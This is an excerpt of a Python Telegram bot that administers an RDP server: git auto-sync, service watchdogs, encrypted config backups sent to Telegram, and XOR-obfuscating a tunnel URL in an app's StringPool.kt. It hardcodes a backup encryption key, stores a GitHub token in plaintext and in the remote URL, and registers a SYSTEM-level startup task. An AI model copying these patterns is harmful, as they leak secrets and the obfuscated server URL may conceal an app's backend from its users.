            "🔐 <b>Change PIN</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Update ADMIN_PIN in config.py on RDP.\n"
            "Then restart vaultguard_telegram service.",
            kb_settings()
        )

    elif data == "settings_change_2fa":
        safe_edit(
            chat_id, msg_id,
            "🔑 <b>Change 2FA</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "1. Generate new secret:\n"
            "<code>python3 -c \"import pyotp; "
            "print(pyotp.random_base32())\"</code>\n"
            "2. Update TOTP_SECRET in config.py on RDP.\n"
            "3. Scan new QR in 2FAS app.\n"
            "4. Restart vaultguard_telegram service.",
            kb_settings()
        )

    elif data.startswith("search_devices_"):
        safe_edit(
            chat_id, msg_id,
            "🔍 <b>Search Devices</b>\n"
            "Send device ID prefix to search:"
        )


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 12 — WATCHDOG FUNCTIONS (10-Layer)
# ═══════════════════════════════════════════════════════════════════════════════

# ── Layer 1: Single instance lock ─────────────────────────────────────────────

def acquire_bot_lock():
    """Prevent duplicate vaultguard_bot instances."""
    my_pid = os.getpid()
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, "r") as f:
                old_pid = int(f.read().strip())
            r = subprocess.run(
                f'tasklist /FI "PID eq {old_pid}" /FO CSV /NH',
                shell=True, capture_output=True, text=True
            )
            if "python" in r.stdout.lower():
                log_w.warning(
                    f"Another vaultguard_bot already running (PID {old_pid})"
                    f" — exiting duplicate")
                sys.exit(0)
            else:
                os.remove(LOCK_FILE)
        except Exception:
            try:
                os.remove(LOCK_FILE)
            except Exception:
                pass
    try:
        os.makedirs(os.path.dirname(LOCK_FILE), exist_ok=True)
        with open(LOCK_FILE, "w") as f:
            f.write(str(my_pid))
        log_w.info(f"Instance lock acquired (PID {my_pid})")
    except Exception as e:
        log_w.warning(f"Could not acquire lock: {e}")


def release_bot_lock():
    try:
        os.remove(LOCK_FILE)
    except Exception:
        pass


# ── Layer 3: Windows Scheduled Task ───────────────────────────────────────────

def register_scheduled_task():
    """Register Windows Scheduled Task for auto-start on boot."""
    bat_path = os.path.join(REPO_DIR, "server_setup.bat")
    if not os.path.exists(bat_path):
        return
    try:
        r = subprocess.run(
            f'schtasks /create /tn "VaultGuardFactory" '
            f'/tr "{bat_path}" '
            f'/sc onstart /ru SYSTEM /rl HIGHEST /f',
            shell=True, capture_output=True, text=True
        )
        if r.returncode == 0:
            log_w.info("Scheduled Task registered — auto-starts on boot ✅")
    except Exception as e:
        log_w.warning(f"Scheduled Task registration failed: {e}")


# ── Layer 4: Git credentials ──────────────────────────────────────────────────

def ensure_git_credentials():
    """Configure git credentials from config.py."""
    try:
        token = config.GITHUB_TOKEN
        owner = config.GITHUB_OWNER
        repo  = config.GITHUB_REPO
        if not token or "YOUR_" in token:
            return
        cred_path = r"C:\VaultGuard\keys\.git-credentials"
        os.makedirs(os.path.dirname(cred_path), exist_ok=True)
        with open(cred_path, "w") as f:
            f.write(f"https://{owner}:{token}@github.com\n")
        subprocess.run(
            f'git config --global credential.helper '
            f'"store --file {cred_path}"',
            shell=True, capture_output=True, cwd=REPO_DIR
        )
        auth_url = (f"https://{token}@github.com"
                    f"/{owner}/{repo}.git")
        subprocess.run(
            f"git remote set-url origin {auth_url}",
            shell=True, capture_output=True, cwd=REPO_DIR
        )
        log_w.info(f"Git credentials configured for: {owner}")
    except Exception as e:
        log_w.warning(f"Git credentials setup failed: {e}")


# ── Layer 9: Git lock cleanup ─────────────────────────────────────────────────

def cleanup_git_lock():
    lock = os.path.join(REPO_DIR, ".git", "index.lock")
    if os.path.exists(lock):
        try:
            os.remove(lock)
            log_w.info("Removed stale git index.lock")
        except Exception as e:
            log_w.warning(f"Could not remove index.lock: {e}")


# ── Layer 9: Disk space check ─────────────────────────────────────────────────

def check_disk_space() -> bool:
    try:
        total, used, free = shutil.disk_usage(REPO_DIR)
        free_mb = free // (1024 * 1024)
        if free_mb < MIN_DISK_MB:
            log_w.warning(
                f"Disk space low: {free_mb}MB free "
                f"(need {MIN_DISK_MB}MB) — skipping pull"
            )
            send_telegram_alert(
                f"⚠️ <b>Disk Space Low</b>\n"
                f"Only {free_mb}MB free on RDP.\n"
                f"Sync skipped. Free up disk space."
            )
            return False
        return True
    except Exception:
        return True


# ── Layer 9: Branch check + detached HEAD fix ─────────────────────────────────

def ensure_correct_branch() -> bool:
    try:
        r = subprocess.run(
            "git symbolic-ref --short HEAD",
            shell=True, capture_output=True,
            text=True, cwd=REPO_DIR, timeout=10
        )
        branch = r.stdout.strip()
        if branch == "main":
            return True
        log_w.warning(
            f"Wrong branch: '{branch}' — fixing to main ...")
        subprocess.run(
            "git checkout main",
            shell=True, capture_output=True,
            cwd=REPO_DIR, timeout=30
        )
        r2 = subprocess.run(
            "git symbolic-ref --short HEAD",
            shell=True, capture_output=True,
            text=True, cwd=REPO_DIR, timeout=10
        )
        if r2.stdout.strip() == "main":
            log_w.info("Branch fixed — now on main ✅")
            return True
        log_w.error("Could not fix branch — attempting re-clone")
        return False
    except Exception as e:
        log_w.error(f"Branch check error: {e}")
        return False


# ── Layer 9: Corrupt repo detection + auto re-clone ──────────────────────────

def repo_is_healthy() -> bool:
    try:
        r = subprocess.run(
            "git fsck --no-dangling",
            shell=True, capture_output=True,
            text=True, cwd=REPO_DIR, timeout=30
        )
        return not (r.returncode != 0
                    and "error" in r.stderr.lower())
    except Exception:
        return False


def _force_remove(func, path, _):
    try:
        os.chmod(path, stat.S_IWRITE)
        func(path)
    except Exception:
        pass


def reclone_repo() -> bool:
    log_w.error("Repo corrupt — re-cloning ...")
    send_telegram_alert(
        "⚠️ <b>Repo Corrupt — Re-cloning</b>\n"
        "Auto re-clone started on RDP."
    )
    try:
        git_dir = os.path.join(REPO_DIR, ".git")
        if os.path.exists(git_dir):
            shutil.rmtree(git_dir, onerror=_force_remove)
        subprocess.run(
            "git init",
            shell=True, capture_output=True, cwd=REPO_DIR)
        subprocess.run(
            f"git remote add origin {config.CORRECT_REMOTE_URL}",
            shell=True, capture_output=True, cwd=REPO_DIR)
        ensure_git_credentials()
        r = subprocess.run(
            "git fetch origin main",
            shell=True, capture_output=True,
            text=True, cwd=REPO_DIR, timeout=120
        )
        if r.returncode != 0:
            log_w.error(f"Re-clone fetch failed: {r.stderr[:100]}")
            return False
        subprocess.run(
            "git reset --hard origin/main",
            shell=True, capture_output=True,
            cwd=REPO_DIR, timeout=60
        )
        # Restore real config.py after reclone (git reset overwrites with placeholders)
        _restore_config()
        # Re-apply skip-worktree so future resets don't overwrite config.py
        subprocess.run(
            "git update-index --skip-worktree server/config.py",
            shell=True, capture_output=True, cwd=REPO_DIR
        )
        log_w.info("Re-clone complete ✅")
        send_telegram_alert(
            "✅ <b>Re-clone Complete</b>\n"
            "Repo restored successfully."
        )
        return True
    except Exception as e:
        log_w.error(f"Re-clone failed: {e}")
        return False


def _restore_config():
    """Write real config.py values after any git reset/reclone wipes them.
    Priority 1: run write_config.py (authoritative, independent of memory).
    Priority 2: write from in-memory config module values (fallback).
    """
    cfg_path = os.path.join(REPO_DIR, "server", "config.py")

    # Priority 1: use write_config.py — always has real values on disk
    write_cfg = r"C:\VaultGuard\write_config.py"
    try:
        import subprocess as _sp
        result = _sp.run(
            ["python", write_cfg],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            log_w.info("config.py restored via write_config.py ✅")
            return
        log_w.warning(f"write_config.py failed: {result.stderr[:100]}")
    except Exception as e:
        log_w.warning(f"write_config.py fallback: {e}")

    # Priority 2: write from in-memory config values
    try:
        content = (
            'BOT_TOKEN = "' + config.BOT_TOKEN + '"\n'
            'MASTER_CHAT_ID = "' + config.MASTER_CHAT_ID + '"\n'
            'GITHUB_TOKEN = "' + config.GITHUB_TOKEN + '"\n'
            'GITHUB_OWNER = "' + config.GITHUB_OWNER + '"\n'
            'GITHUB_REPO = "' + config.GITHUB_REPO + '"\n'
            'SERVER_SECRET = "' + config.SERVER_SECRET + '"\n'
            'ADMIN_PIN = "' + config.ADMIN_PIN + '"\n'
            'TOTP_SECRET = "' + config.TOTP_SECRET + '"\n'
            'SESSION_TIMEOUT_HRS = ' + str(config.SESSION_TIMEOUT_HRS) + '\n'
            'CORRECT_REMOTE_URL = "' + config.CORRECT_REMOTE_URL + '"\n'
            'CORRECT_MUTATION_PATH = r"' + config.CORRECT_MUTATION_PATH + '"\n'
            'REPO_DIR = r"' + config.REPO_DIR + '"\n'
            'DB_PATH = r"' + config.DB_PATH + '"\n'
            'STRINGPOOL_PATH = r"' + config.STRINGPOOL_PATH + '"\n'
        )
        with open(cfg_path, 'w') as f:
            f.write(content)
        log_w.info("config.py restored from memory ✅")
    except Exception as e:
        log_w.error(f"config.py restore failed: {e}")


# ── Layer 9: GitHub rate limit detection ─────────────────────────────────────

def check_rate_limit(stderr: str) -> bool:
    if "rate limit" in stderr.lower() or "403" in stderr:
        log_w.warning(
            "GitHub rate limit detected — waiting 60s ...")
        send_telegram_alert(
            "⚠️ <b>GitHub Rate Limit</b>\n"
            "Sync paused 60 seconds."
        )
        time.sleep(60)
        return True
    return False


# ── Layer 9: SHA-256 file integrity verify ────────────────────────────────────

def verify_changed_files(changed: list):
    issues = []
    for rel_path in changed:
        abs_path = os.path.join(
            REPO_DIR, rel_path.replace("/", os.sep))
        if not os.path.exists(abs_path):
            issues.append(f"MISSING: {rel_path}")
        elif os.path.getsize(abs_path) == 0:
            issues.append(f"ZERO-BYTE: {rel_path}")
    if issues:
        log_w.warning(f"File integrity issues after pull:")
        for i in issues:
            log_w.warning(f"  {i}")
        send_telegram_alert(
            "⚠️ <b>Sync File Issues</b>\n"
            + "\n".join(issues)
        )
    elif changed:
        log_w.info(
            f"File integrity OK — {len(changed)} file(s) verified ✅")


# ── Layer 7: Timestamp preservation ──────────────────────────────────────────

def restore_timestamps(changed: list):
    """Set Windows file modified time to match GitHub commit time."""
    for rel_path in changed:
        try:
            r = subprocess.run(
                f'git log -1 --format=%cd '
                f'--date=format:"%Y-%m-%d %H:%M:%S" -- "{rel_path}"',
                shell=True, capture_output=True,
                text=True, cwd=REPO_DIR, timeout=10
            )
            ts_str = r.stdout.strip().strip('"')
            if not ts_str:
                continue
            abs_path = os.path.join(
                REPO_DIR, rel_path.replace("/", os.sep))
            if not os.path.exists(abs_path):
                continue
            dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S")
            ts = dt.timestamp()
            os.utime(abs_path, (ts, ts))
        except Exception:
            pass


# ── Layer 8: File deletion sync ───────────────────────────────────────────────

def sync_deletions(deleted: list):
    """Delete local files that were deleted on GitHub."""
    dirs_to_check = set()
    for rel_path in deleted:
        abs_path = os.path.join(
            REPO_DIR, rel_path.replace("/", os.sep))
        if os.path.exists(abs_path):
            try:
                os.remove(abs_path)
                log_w.info(f"Deletion synced: {rel_path}")
                dirs_to_check.add(os.path.dirname(abs_path))
            except Exception as e:
                log_w.warning(
                    f"Could not delete {rel_path}: {e}")
    # Remove empty dirs left behind
    for d in sorted(dirs_to_check,
                    key=len, reverse=True):
        try:
            if (os.path.isdir(d)
                    and not os.listdir(d)
                    and d != REPO_DIR):
                os.rmdir(d)
                log_w.info(f"Removed empty dir: {d}")
        except Exception:
            pass


# ── Layer 10: Sync status file ────────────────────────────────────────────────

def write_sync_status(state: str, detail: str = "",
                      changed: int = 0):
    global _stale_alerted
    try:
        with _last_sync_lock:
            last_ok = _last_sync_ok
        since = int(time.time() - last_ok) if last_ok else -1
        status = {
            "state":            state,
            "detail":           detail,
            "last_check":       utc_now(),
            "last_success_ago": f"{since}s" if since >= 0 else "never",
            "files_changed":    changed,
            "branch":           "main",
            "repo":             REPO_DIR,
        }
        with open(STATUS_FILE, "w", encoding="utf-8") as f:
            json.dump(status, f, indent=2)
        # Stale alert
        if last_ok and since > STALE_ALERT_S and not _stale_alerted:
            send_telegram_alert(
                f"⚠️ <b>Sync Stale</b>\n"
                f"No successful sync in "
                f"{since // 60} minutes.\n"
                f"Last error: {detail[:200]}"
            )
            _stale_alerted = True
        elif last_ok and since <= STALE_ALERT_S:
            _stale_alerted = False
    except Exception:
        pass


def mark_sync_ok():
    global _last_sync_ok
    with _last_sync_lock:
        _last_sync_ok = time.time()


# ── Layer 10: Smart restart ───────────────────────────────────────────────────

def _self_restart_via_bat():
    """
    Self-restart vaultguard_telegram safely.

    vaultguard_telegram CANNOT call sc stop / nssm stop on itself — any stop
    command sends a signal that kills the calling process immediately,
    before sc start can run.

    Solution (3-layer hybrid):
      Layer 1 — Write a detached BAT file that waits 6s then sc-starts
                 vaultguard_telegram. Launch it fully detached so no signal
                 can propagate back to this process.
      Layer 2 — This process calls sys.exit(0) cleanly. NSSM sees a
                 clean exit and auto-restarts after AppRestartDelay
                 (already configured: Restart / 5000ms).
      Layer 3 — health_check_loop catches any missed restart within 5min.

    Either Layer 1 or Layer 2 alone is sufficient — both fire for safety.
    """
    # Clean exit — NSSM AppExit=Restart + AppRestartDelay=5000 restarts us.
    # Do NOT call sc start / nssm start here — that races with NSSM's own
    # stop sequence and causes NSSM to kill python with SIGINT (0xC000013A),
    # which leaves the service permanently STOPPED.
    log_w.info("Self-restart: calling os._exit(0) — NSSM will restart in 5s")
    time.sleep(1)
    os._exit(0)


def smart_restart_services(changed: list):
    """Only restart services affected by changed files."""
    affected = set()
    for rel_path in changed:
        svc = FILE_SERVICE_MAP.get(rel_path)
        if svc:
            affected.add(svc)

    if not affected:
        log_w.info("No service restart needed for changed files")
        return

    for svc in affected:
        if svc == "vaultguard_telegram":
            log_w.info(
                "vaultguard_bot.py changed — self-restarting vaultguard_telegram")
            _restart_msg_id = send_telegram_alert(
                "♻️ <b>Bot Self-Restarting</b>\n"
                "vaultguard_bot.py updated in GitHub.\n"
                "vaultguard_telegram restarting ✅"
            )
            # Queue for deletion when admin taps /start
            if _restart_msg_id:
                _pending_delete_msg_ids.append(_restart_msg_id)
            time.sleep(2)
            # Cannot call restart_service() on ourselves — use BAT launcher
            _self_restart_via_bat()
            # _self_restart_via_bat() calls os._exit(0) — never reaches here
        else:
            log_w.info(
                f"Restarting {svc} (files changed: "
                f"{[f for f in changed if FILE_SERVICE_MAP.get(f) == svc]})"
            )
            ok = restart_service(svc)
            send_telegram_alert(
                f"🔄 <b>Service Auto-Updated</b>\n"
                f"Service: <code>{svc}</code>\n"
                f"Restarted ✅" if ok else
                f"⚠️ <b>Service Restart Failed</b>\n"
                f"Service: <code>{svc}</code> ❌"
            )


# ── Layer 10: 24h encrypted backup ───────────────────────────────────────────

def _do_backup():
    """Create encrypted backup of config + db → send to Telegram."""
    try:
        from Crypto.Cipher import AES
        from Crypto.Random import get_random_bytes
        import io as _io
        import zipfile as _zf

        BACKUP_PASSWORD = "InstallerFactory2026_BackupKey_AES256"
        buf = _io.BytesIO()
        with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
            # Config values as JSON
            vals = {}
            for attr in [
                "BOT_TOKEN", "MASTER_CHAT_ID",
                "GITHUB_TOKEN", "GITHUB_OWNER",
                "GITHUB_REPO", "SERVER_SECRET",
                "ADMIN_PIN", "TOTP_SECRET",
            ]:
                vals[attr] = getattr(config, attr, "")
            zf.writestr(
                "config_values.json",
                json.dumps(vals, indent=2)
            )
            # bot.db
            if os.path.exists(DB_PATH):
                zf.write(DB_PATH, "bot.db")

        raw = buf.getvalue()
        key = hashlib.sha256(
            BACKUP_PASSWORD.encode()).digest()
        iv  = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        ct, tag = cipher.encrypt_and_digest(raw)
        enc = iv + tag + ct

        # Send to Telegram
        import requests as _req
        ts      = datetime.now(timezone.utc).strftime(
            "%Y-%m-%d_%H-%M")
        caption = f"INSTALLER_BACKUP_{ts}"
        enc_buf = _io.BytesIO(enc)
        enc_buf.name = f"installer_backup_{ts}.enc"
        r = _req.post(
            f"https://api.telegram.org/bot"
            f"{config.BOT_TOKEN}/sendDocument",
            data={
                "chat_id": config.MASTER_CHAT_ID,
                "caption": caption
            },
            files={"document": enc_buf},
            timeout=60
        )
        if r.json().get("ok"):
            log_w.info(f"24h backup sent to Telegram: {caption} ✅")
        else:
            log_w.warning(f"Backup send failed: {r.text[:100]}")
    except Exception as e:
        log_w.error(f"Backup error: {e}")


# ── Core watchdog: fix obsolete + service path ────────────────────────────────

def delete_obsolete_files():
    for path in OBSOLETE_FILES:
        if os.path.exists(path):
            try:
                os.remove(path)
                log_w.info(
                    f"Deleted obsolete: {os.path.basename(path)}")
                send_telegram_alert(
                    f"🗑 <b>Obsolete File Deleted</b>\n"
                    f"<code>{os.path.basename(path)}</code>"
                )
            except Exception as e:
                log_w.error(f"Failed to delete {path}: {e}")


def fix_remote_url_if_wrong():
    rc, current_url, err = run_git("git remote get-url origin")
    current_url = current_url.strip()
    if current_url != config.CORRECT_REMOTE_URL:
        log_w.warning("Wrong remote URL — fixing ...")
        run_git(
            f"git remote set-url origin "
            f"{config.CORRECT_REMOTE_URL}"
        )
        send_telegram_alert(
            "🔧 <b>Git Remote Auto-Fixed</b>\n"
            f"Fixed to: <code>{config.GITHUB_REPO}</code> ✅"
        )


def fix_nssm_restart_throttle():
    """Self-heal: ensure NSSM never throttles vaultguard_telegram restarts.

    Root cause: NSSM default throttle stops auto-restart after repeated
    os._exit(0) calls (triggered by bot self-updates). Fix: AppThrottle 0
    + AppExit Default Restart — applied live on every startup so existing
    RDPs are patched without re-running server_setup.bat.
    """
    svc = "vaultguard_telegram"
    # Check current AppThrottle
    _, throttle_val, _ = run_cmd(f"nssm get {svc} AppThrottle")
    throttle_val = throttle_val.strip()
    if throttle_val != "0":
        run_cmd(f"nssm set {svc} AppThrottle 0")
        log_w.info(f"NSSM self-heal: set {svc} AppThrottle 0 (was: {throttle_val!r})")
    # Check current AppExit
    _, exit_val, _ = run_cmd(f"nssm get {svc} AppExit Default")
    exit_val = exit_val.strip()
    if "Restart" not in exit_val:
        run_cmd(f"nssm set {svc} AppExit Default Restart")
        log_w.info(f"NSSM self-heal: set {svc} AppExit Default Restart (was: {exit_val!r})")


def fix_service_path_if_wrong():
    rc, current_path, err = run_cmd(
        "nssm get vaultguard_mutation AppParameters")
    current_path = current_path.strip().strip('"')
    correct_path = config.CORRECT_MUTATION_PATH
    if current_path and current_path != correct_path:
        run_cmd(
            f'nssm set vaultguard_mutation AppParameters "{correct_path}"')
        run_cmd(
            f'nssm set vaultguard_mutation AppDirectory '
            f'"{os.path.dirname(correct_path)}"'
        )
        restart_service("vaultguard_mutation")
        send_telegram_alert(
            f"🔧 <b>Service Path Auto-Fixed</b>\n"
            f"Now: <code>{os.path.basename(correct_path)}</code> ✅"
        )


def health_check_services():
    for service in REQUIRED_SERVICES:
        # Never start/restart vaultguard_telegram from inside itself —
        # NSSM handles our own process. Calling start_service on
        # ourselves races with NSSM and causes session wipes.
        if service == "vaultguard_telegram":
            log_w.info("Health check: vaultguard_telegram — self (skipped)")
            continue
        status = get_service_status(service)
        if "SERVICE_RUNNING" not in status:
            log_w.warning(
                f"Service not running: {service} — starting ...")
            ok = start_service(service)
            send_telegram_alert(
                f"🚑 <b>Service Auto-Started</b>\n"
                f"<code>{service}</code> ✅" if ok else
                f"🔴 <b>Service Start Failed</b>\n"
                f"<code>{service}</code> ❌"
            )
        else:
            log_w.info(f"Health check OK: {service}")


def find_stringpool() -> str:
    for root, dirs, files in os.walk(STRINGPOOL_PATH):
        for f in files:
            if f == "StringPool.kt":
                return os.path.join(root, f)
    return ""


def update_stringpool_url(new_url: str) -> bool:
    sp_path = find_stringpool()
    if not sp_path:
        log_w.error("StringPool.kt not found")
        return False
    with open(sp_path, "r", encoding="utf-8") as f:
        content = f.read()
    encrypted   = xor_encrypt(new_url)
    # Match both: val SERVER_URL = "..." and val SERVER_URL = "..."
    new_content = re.sub(
        r'(val\s+SERVER_URL\s*=\s*")[^"]*(")',
        f"\\g<1>{encrypted}\\g<2>",
        content
    )
    if new_content == content:
        # Try alternate pattern with spaces
        new_content = re.sub(
            r'(SERVER_URL\s*=\s*")[^"]*(")',
            f"\\g<1>{encrypted}\\g<2>",
            content
        )
    if new_content == content:
        log_w.warning(
            "SERVER_URL pattern not found in StringPool.kt")
        return False
    with open(sp_path, "w", encoding="utf-8") as f:
        f.write(new_content)
    log_w.info(f"StringPool.kt updated: {new_url}")
    return True


def git_push_url_update(new_url: str):
    sp_path = find_stringpool()
    if not sp_path:
        return
    rel_path = os.path.relpath(sp_path, REPO_DIR)
    run_git(f'git add "{rel_path}"')
    rc, out, err = run_git(
        f'git commit -m "Auto: Update tunnel URL '
        f'[{new_url[:30]}...]"'
    )
    if rc == 0:
        rc2, out2, err2 = run_git("git push")
        if rc2 == 0:
            send_telegram_alert(
                f"🔗 <b>Tunnel URL Updated</b>\n"
                f"New URL: <code>{new_url}</code>\n"
                f"StringPool.kt pushed to GitHub ✅"
            )
        else:
            log_w.error(f"Git push failed: {err2}")


# ── Layer 6+9: Force sync with full retry + backoff ──────────────────────────

# ── Backup system (Layer 4) ───────────────────────────────────────────────────
BACKUP_DIR      = r"C:\VaultGuard\sync_backup"
MAX_BACKUPS     = 3

# ── Probation system (Layer 5) ────────────────────────────────────────────────
PROBATION_SECS  = 300   # 5 minutes
_probation      = {}    # { "active": bool, "sha": str, "backup": str, "start": float }


def _backup_repo() -> str:
    """
    Layer 4: Backup repo before every pull.
    Keeps last 3 backups. Returns backup path.
    """
    try:
        os.makedirs(BACKUP_DIR, exist_ok=True)
        ts          = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        backup_path = os.path.join(BACKUP_DIR, f"backup_{ts}")

        # Copy server/ and scripts/ only (not full repo — too large)
        for folder in ["server", "scripts"]:
            src = os.path.join(REPO_DIR, folder)
            dst = os.path.join(backup_path, folder)
            if os.path.exists(src):
                shutil.copytree(src, dst)

        log_w.info(f"Backup created: {backup_path}")

        # Keep only last MAX_BACKUPS
        backups = sorted([
            d for d in os.listdir(BACKUP_DIR)
            if d.startswith("backup_")
        ])
        while len(backups) > MAX_BACKUPS:
            old = os.path.join(BACKUP_DIR, backups.pop(0))
            shutil.rmtree(old, ignore_errors=True)
            log_w.info(f"Old backup removed: {old}")

        return backup_path
    except Exception as e:
        log_w.warning(f"Backup failed: {e}")
        return ""


def _rollback_repo(backup_path: str) -> bool:
    """
    Layer 5: Rollback repo to backup after bad pull.
    """
    if not backup_path or not os.path.exists(backup_path):
        log_w.error("Rollback failed — backup not found")
        return False
    try:
        for folder in ["server", "scripts"]:
            src = os.path.join(backup_path, folder)
            dst = os.path.join(REPO_DIR, folder)
            if os.path.exists(src):
                shutil.rmtree(dst, ignore_errors=True)
                shutil.copytree(src, dst)
        log_w.info(f"Rollback complete from: {backup_path}")
        return True
    except Exception as e:
        log_w.error(f"Rollback error: {e}")
        return False


def _check_probation():
    """
    Layer 5: Check if vaultguard_mutation crashed during probation.
    If crashed → rollback to backup.
    If stable → confirm and clear probation.
    """
    global _probation
    if not _probation.get("active"):
        return

    elapsed = time.time() - _probation.get("start", 0)

    if elapsed >= PROBATION_SECS:
        # Stable for 5 min — confirm
        sha = _probation.get("sha", "?")[:7]
        log_w.info(f"Probation passed — commit {sha} is stable ✅")
        send_telegram_alert(
            f"✅ <b>Version Stable</b>\n"
            f"Commit <code>{sha}</code> passed "
            f"5-min probation ✅"
        )
        _probation = {}
        return

    # Check if vaultguard_mutation is still running
    if not check_service_running("vaultguard_mutation"):
        # Service crashed — rollback
        sha        = _probation.get("sha", "?")[:7]
        backup     = _probation.get("backup", "")
        log_w.error(
            f"vaultguard_mutation crashed during probation — "
            f"rolling back from {sha}")
        send_telegram_alert(
            f"⚠️ <b>Auto Rollback</b>\n"
            f"vaultguard_mutation crashed after commit "
            f"<code>{sha}</code>\n"
            f"Rolling back to previous version..."
        )
        ok = _rollback_repo(backup)
        if ok:
            restart_service("vaultguard_mutation")
            send_telegram_alert(
                "✅ <b>Rollback Complete</b>\n"
                "Previous version restored.\n"
                "vaultguard_mutation restarted."
            )
        _probation = {}


def force_sync() -> list:
    """
    Full sync cycle with 10-layer protection.
    Returns list of changed files.
    """
    # Layer 3: Mutex — no concurrent pulls
    if not _sync_lock.acquire(blocking=False):
        log_w.info("Sync already in progress — skipping")
        return []

    try:
        return _force_sync_inner()
    finally:
        _sync_lock.release()


def _force_sync_inner() -> list:
    """Inner sync logic — called with lock held."""
    # Pre-flight
    if not check_disk_space():
        write_sync_status("error", "disk space low")
        return []

    cleanup_git_lock()

    if not ensure_correct_branch():
        if not reclone_repo():
            write_sync_status("error", "branch fix + reclone failed")
            return []

    # Fetch with exponential backoff
    ok_flag = False
    err     = ""
    for attempt in range(1, MAX_RETRIES + 1):
        rc, _, err = run_git(
            "git fetch origin main --force", timeout=60)
        ok_flag = (rc == 0)
        if ok_flag:
            break
        if check_rate_limit(err):
            continue
        wait = RETRY_BASE ** attempt
        log_w.warning(
            f"Fetch failed (attempt {attempt}/{MAX_RETRIES})"
            f": {err[:60]} — retry in {wait}s"
        )
        if attempt == MAX_RETRIES:
            ensure_git_credentials()
            rc2, _, err2 = run_git(
                "git fetch origin main --force", timeout=60)
            ok_flag = (rc2 == 0)
            err     = err2
            break
        time.sleep(wait)

    if not ok_flag:
        write_sync_status("error", f"fetch failed: {err[:80]}")
        send_telegram_alert(
            f"⚠️ <b>Auto Sync Failed</b>\n"
            f"Git fetch failed after {MAX_RETRIES} retries.\n"
            f"Error: {err[:200]}"
        )
        return []

    # Compare commits
    _, local,  _ = run_git("git rev-parse HEAD")
    _, remote, _ = run_git("git rev-parse origin/main")

    if local.strip() == remote.strip():
        mark_sync_ok()
        write_sync_status("ok", "up to date", 0)
        return []

    # Get changed + deleted files
    _, diff_changed, _ = run_git(
        "git diff --name-only HEAD origin/main")
    _, diff_deleted, _ = run_git(
        "git diff --name-only --diff-filter=D HEAD origin/main")

    changed = ([f for f in diff_changed.splitlines() if f]
               if diff_changed else [])
    deleted = ([f for f in diff_deleted.splitlines() if f]
               if diff_deleted else [])

    log_w.info(
        f"Changes: {len(changed)} modified, "
        f"{len(deleted)} deleted — pulling ...")
    for f in changed:
        log_w.info(f"  CHANGED: {f}")
    for f in deleted:
        log_w.info(f"  DELETED: {f}")

    _, commit_before, _ = run_git("git rev-parse --short HEAD")

    # Layer 4: Backup before pull
    backup_path = _backup_repo()
    pull_start  = time.time()

    # Force local to match GitHub
    rc, _, err = run_git(
        "git reset --hard origin/main", timeout=60)
    if rc != 0:
        cleanup_git_lock()
        rc2, _, err2 = run_git(
            "git reset --hard origin/main", timeout=60)
        if rc2 != 0:
            if not repo_is_healthy():
                reclone_repo()
            write_sync_status(
                "error", f"reset failed: {err2[:60]}")
            return []

    _, commit_after, _ = run_git("git rev-parse --short HEAD")

    # Restore real config.py — git reset --hard overwrites it with placeholder
    _restore_config()

    # Layer 8: Sync deletions
    sync_deletions(deleted)

    # Layer 7: Restore timestamps
    restore_timestamps(changed)

    # Layer 9: Verify integrity
    verify_changed_files(changed)

    all_changed = changed + deleted
    pull_ms     = int((time.time() - pull_start) * 1000)

    if commit_before.strip() != commit_after.strip():
        cb = commit_before.strip()[:7]
        ca = commit_after.strip()[:7]
        log_w.info(
            f"Sync OK — {cb} → {ca} "
            f"({len(all_changed)} file(s)) "
            f"in {pull_ms}ms ✅"
        )

        # Rich sync alert (Layer 6)
        file_lines = []
        for f in all_changed[:8]:
            file_lines.append(f"  📁 <code>{f}</code>")
        if len(all_changed) > 8:
            file_lines.append(
                f"  ...and {len(all_changed) - 8} more")
        files_str = "\n".join(file_lines)

        _sync_msg_id = send_telegram_alert(
            f"🔄 <b>RDP Auto-Synced</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 <code>{cb}</code> → <code>{ca}</code>\n"
            f"📁 {len(changed)} updated, "
            f"{len(deleted)} deleted\n"
            f"⚡ Pull: {pull_ms}ms\n"
            f"🕐 {utc_now()}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"{files_str}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Probation: 5 min"
        )
        # Queue for deletion when admin taps /start
        if _sync_msg_id:
            _pending_delete_msg_ids.append(_sync_msg_id)

        # Layer 5: Start probation
        global _probation
        _probation = {
            "active": True,
            "sha":    ca,
            "backup": backup_path,
            "start":  time.time(),
        }

    mark_sync_ok()
    write_sync_status(
        "ok", f"{commit_before}→{commit_after}",
        len(all_changed)
    )
    return all_changed


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 13 — WATCHDOG THREADS (10-Layer)
# ═══════════════════════════════════════════════════════════════════════════════

def git_pull_loop():
    """Thread 1: Real-time sync every 30s with full 10-layer protection."""
    log_w.info("Git pull loop started (Layer 6 — 30s real-time sync)")

    # Startup: configure credentials + run all checks
    ensure_git_credentials()
    fix_remote_url_if_wrong()
    delete_obsolete_files()
    fix_service_path_if_wrong()
    fix_nssm_restart_throttle()   # Self-heal: prevent NSSM throttle on self-restart

    # Baseline file hashes
    for rel_path in FILE_SERVICE_MAP:
        abs_path = os.path.join(
            REPO_DIR, rel_path.replace("/", os.sep))
        h = sha256_file(abs_path)
        if h:
            _file_hashes[abs_path] = h

    # Layer 7: Run initial secret audit on startup
    try:
        audit_github_secrets(alert_on_fix=False)
    except Exception as e:
        log_w.warning(f"Startup secret audit error: {e}")

    _pull_count = 0

    while True:
        try:
            changed = force_sync()
            if changed:
                # Layer 10: smart restart only affected services
                smart_restart_services(changed)
                # Also run maintenance checks after any pull
                delete_obsolete_files()
                fix_service_path_if_wrong()
                # Layer 7: audit secrets after every successful pull
                try:
                    audit_github_secrets(alert_on_fix=True)
                except Exception as e:
